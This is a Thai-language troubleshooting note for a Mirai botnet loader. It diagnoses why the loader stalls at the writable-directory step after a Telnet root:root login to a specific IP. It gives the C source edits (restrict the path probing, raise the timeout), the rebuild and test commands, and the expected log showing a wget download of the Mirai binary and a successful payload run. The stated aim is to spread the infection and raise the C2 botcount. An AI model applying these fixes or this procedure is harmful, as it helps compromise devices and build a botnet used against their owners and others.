# Loader ค้างที่ขั้นหา Writable Directory

## สรุปสั้น

Loader เข้า `bot2` ได้แล้ว และ login ผ่านสำเร็จ แต่ค้างอยู่ที่ขั้นหาโฟลเดอร์สำหรับวางไฟล์ จึงยังไม่ถึงขั้นโหลด `mirai` และรัน payload ทำให้การแพร่หรือติดตั้งยังไม่จบ

ข้อความจาก log ที่บอกปัญหาชัดเจน:

```text
[FD6] Timed out
ERR|125.20.30.112:23 root:root |10
```

ความหมายของ state:

| ค่า | ความหมาย |
| --- | --- |
| `10` | ขั้นตอนหา directory ที่เขียนไฟล์ได้ |

ดังนั้นปัญหานี้ไม่ใช่รหัสผ่านผิด และไม่ใช่ CNC พัง แต่เป็นการค้างหรือหมดเวลาในขั้นหา writable directory

---

## หลักฐานจาก Log

จาก log ที่เพื่อนส่งมา สามารถสรุปได้ดังนี้:

| สิ่งที่เห็นใน log | แปลว่า |
| --- | --- |
| มี `kami`, `kami/run`, และทดสอบ `.nippon` ยาวๆ | Login ผ่านแล้ว และ loader กำลังหาที่เขียนไฟล์ได้ |
| ยิง path เป็นร้อย เช่น `/proc`, `/sys`, `/dev` | Loader ไล่ path จาก `/proc/mounts` ทั้งเครื่อง ซึ่งบน Alpine มี mount เยอะ |
| จบด้วย `Timed out` และ `ERR|...|10` | ขั้นหา writable directory ใช้เวลานานเกินและถูกตัดก่อนจบ |
| ยังไม่เห็น `Found writeable directory`, `wget`, หรือ `OK|` | ยังไม่ถึงขั้นอัปโหลด binary |

ข้อสรุปคือควรแก้ที่ขั้นหา writable directory ไม่ใช่ไปแก้รหัสผ่านหรือ CNC

---

## จุดที่ต้องแก้

มี 2 จุดหลักที่ต้องแก้ใน loader

### 1. `loader/src/connection.c`

ฟังก์ชัน:

```c
connection_consume_mounts
```

ปรับจากการอ่าน mount ทั้งเครื่องแล้วทดสอบทีละ path ให้เหลือการทดสอบเฉพาะ path สำคัญ:

| เดิม | ใหม่ |
| --- | --- |
| อ่าน mount ทั้งเครื่อง แล้วทดสอบทีละ path | ทดสอบแค่ `/run`, `/tmp`, `/var/tmp`, `/dev/shm`, `/` |

เหตุผลคือจาก log เห็นแล้วว่า `/run` เขียนได้ เช่น `kami/run` จึงไม่จำเป็นต้องไล่ path ทั้งเครื่อง

### 2. `loader/src/server.c`

ตอนเข้าสู่ขั้น mount หรือ writable directory ให้เพิ่ม timeout:

| เดิม | ใหม่ |
| --- | --- |
| Timeout ประมาณ 30 วินาที | Timeout 120 วินาที |

การเพิ่ม timeout ช่วยกันกรณีเครื่องช้าหรือระบบมี mount เยอะ

---

## ลำดับการทำงานของ Loader

Loader ทำงานเป็นขั้นตอนดังนี้:

1. ต่อ Telnet และ login
2. หาโฟลเดอร์ที่เขียนไฟล์ได้
3. ตรวจ architecture ของเครื่อง เช่น `x86`
4. ใช้ `wget` โหลด binary จาก loader
5. รัน payload เช่น `dvrHelper`
6. ได้ `OK|` เมื่อรันสำเร็จ

ปัญหาในเคสนี้ค้างที่ขั้นที่ 2:

```text
หาโฟลเดอร์ที่เขียนไฟล์ได้
```

จึงยังไม่ถึงขั้น `wget` และยังไม่ได้รัน `mirai`

---

## สาเหตุ

Alpine หรือ LXC มักมี mount จำนวนมาก ทำให้ loader ใช้เวลานานมากตอนอ่านและทดสอบ path จาก `/proc/mounts`

เมื่อทดสอบ path เยอะเกินไป ขั้นนี้จึงใช้เวลานานจน timeout และจบด้วย:

```text
ERR|125.20.30.112:23 root:root |10
```

จาก log รู้แล้วว่า `/run` เขียนได้ จึงควรลอง path หลักก่อน เพื่อให้จบเร็วและเข้าสู่ขั้น `wget` ต่อได้

---

## วิธี Rebuild และทดสอบ

หลังแก้โค้ดแล้ว rebuild:

```sh
./build.debug.sh
```

จากนั้นทดสอบ loader:

```sh
echo "IP:23 user:pass" | ./loader.dbg
```

---

## ผลลัพธ์ที่ควรเห็นหลังแก้

ถ้าแก้ถูกต้อง จะเห็น log ประมาณนี้:

```text
Found writeable directory: /run/
Detected architecture: 'x86'
Upload method is wget
wget ... mirai.x86 ... 100%
Succesfully ran payload
OK|125.20.30.112:23 root:root x86
```

แปลว่า:

1. Loader เลือก `/run` เป็น writable directory ได้
2. โหลด binary สำเร็จ
3. รัน payload บน `bot2` สำเร็จ
4. Loader ติด `bot2` สำเร็จ และได้ `OK|`

---

## ประโยคสรุปให้จำ

Loader ค้างตอนหาโฟลเดอร์วางไฟล์บน Alpine เพราะ probe mount เยอะเกินจน timeout ที่ state `10` จึงแก้ให้ลองเฉพาะ path หลักและเพิ่ม timeout แล้ว loader จะไปถึงขั้น `wget` และรัน `mirai` ได้จนเห็น `OK|`

---

## สิ่งที่ไม่ได้แก้

เพื่อไม่ให้สับสน ปัญหานี้ไม่ได้เกี่ยวกับส่วนต่อไปนี้:

| สิ่งที่เห็น | ความหมาย |
| --- | --- |
| Bot scanner / CNC | ไม่ใช่จุดที่แก้ในเคสนี้ |
| `Failed to bind to core` | เป็น warning ใน LXC ข้ามได้ |
| ข้อความแปลกๆ ตอน detect architecture | เป็น dump binary ปกติ |

ในเคสนี้คำว่า "แพร่ได้" หมายถึง loader ติด `bot2` สำเร็จและได้ `OK|`

ถ้าต้องการเห็นผลบน C2 ต้องมี process bot ต่อเข้า CNC และ botcount ต้องเพิ่มขึ้น
